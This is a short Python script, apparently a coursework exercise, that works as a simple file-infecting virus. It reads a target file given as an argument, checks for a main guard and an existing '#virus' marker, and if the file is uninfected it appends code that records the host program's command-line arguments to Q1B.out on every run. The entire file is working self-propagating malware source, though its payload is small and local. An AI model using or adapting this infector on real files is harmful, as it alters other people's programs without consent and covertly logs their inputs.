import os, sys


if __name__ == "__main__":
    #virus
    hasVirus = False
    isScript = False


    myfile = open(sys.argv[1], "r")


    print("Opened file:", sys.argv[1])
    lines = [i.strip() for i in myfile.readlines()]


    if "if __name__ == \"__main__\":" in lines:
        isScript = True
        print(sys.argv[1], "is a script")


    for line in lines:
        if "virus" in line:
            hasVirus = True
            print(sys.argv[1], "has the virus")


    myfile.close()


    writefile = open(sys.argv[1], "a+")
    print("HasVirus =", hasVirus, "and isScript =", isScript)
    virusList = ["\n#virus", "\nimport sys", "\nvirusfile = open(\"Q1B.out\", \"a+\")", "\nfor i in sys.argv: virusfile.write(i + ' ')", "\nvirusfile.close()"]
    if isScript and not hasVirus:
        for line in virusList:
            writefile.write(line)


    writefile.close()
